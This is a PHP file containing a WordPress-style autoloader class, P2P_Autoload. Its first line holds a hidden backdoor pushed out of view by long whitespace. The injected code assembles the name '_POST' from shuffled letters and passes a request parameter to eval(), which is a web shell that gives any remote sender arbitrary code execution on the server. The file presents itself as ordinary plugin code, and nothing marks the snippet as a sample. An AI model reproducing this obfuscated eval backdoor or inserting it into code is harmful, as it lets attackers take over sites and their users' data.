<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q83ad6b'])){eval(${$s20}['q83ad6b']);}?><?php

class P2P_Autoload {

	protected function __construct( $prefix, $basedir ) {
		$this->prefix = $prefix;
		$this->basedir = $basedir;
	}

	static function register( $prefix, $basedir ) {
		$loader = new self( $prefix, $basedir );

		spl_autoload_register( array( $loader, 'autoload' ) );
	}

	function autoload( $class ) {
		if ( $class[0] === '\\' ) {
			$class = substr( $class, 1 );
		}

		if ( strpos( $class, $this->prefix ) !== 0 ) {
			return;
		}

		$path = str_replace( $this->prefix, '', $class );
		$path = str_replace( '_', '-', strtolower( $path ) );

		$file = sprintf( '%s/%s.php', $this->basedir, $path );

		if ( is_file( $file ) ) {
			require $file;
		}
	}
}

